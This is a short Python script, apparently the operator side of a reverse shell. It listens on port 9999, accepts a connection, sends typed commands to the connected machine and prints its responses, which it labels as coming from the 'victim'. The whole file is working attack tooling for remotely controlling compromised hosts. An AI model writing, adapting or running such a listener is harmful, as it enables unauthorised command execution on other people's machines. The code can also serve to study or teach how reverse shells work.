import socket
import sys
def socket_making():
    try:
        global host
        global port
        global s
        host =  ""
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("socket_work error: "+str(msg))
def socket_bind():
    try:
        host = socket.gethostname()
        port = 9999
        print("binding the port : " + str(port))
        s.bind((host,port))
        s.listen(5)
    except socket.error as msg:
        print("socket binding error " +str(msg) + "\n" + "trying...")
def socket_accept():
    conn,addres = s.accept()
    print("connection has been stable : "+addres[0]+ "\nhere port number is : " + str(addres[1]))
    sending_command(conn)
    conn.close()
def sending_command(conn):
    while True:
        cmd = input()
        if cmd == "quite":
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd))>0:
            conn.send(str.encode(cmd))
            response_victm = str(conn.recv(1024),"utf-8")
            print(response_victm,end="")
def main():
    socket_making()
    socket_bind()
    socket_accept()
try:
    main()
except:
    print("\nThanks for connections")